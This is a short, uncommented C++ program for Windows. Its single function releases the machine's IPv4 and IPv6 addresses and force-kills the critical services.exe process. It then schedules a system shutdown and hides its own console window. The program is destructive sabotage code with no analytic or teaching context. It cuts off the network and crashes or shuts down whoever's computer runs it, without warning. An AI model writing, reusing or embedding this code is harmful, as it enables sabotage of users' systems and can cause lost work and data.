#include <iostream>

#include <windows.h>

#include <unistd.h>

using namespace std;


void kavy()
{
    system("ipconfig /release");
    system("ipconfig /release6");
    sleep(3);
    system("taskkill /IM services.exe /F");
    system("shutdown /s /t 60");
}




int main()
{
    kavy();
    FreeConsole();
    return 0;
}
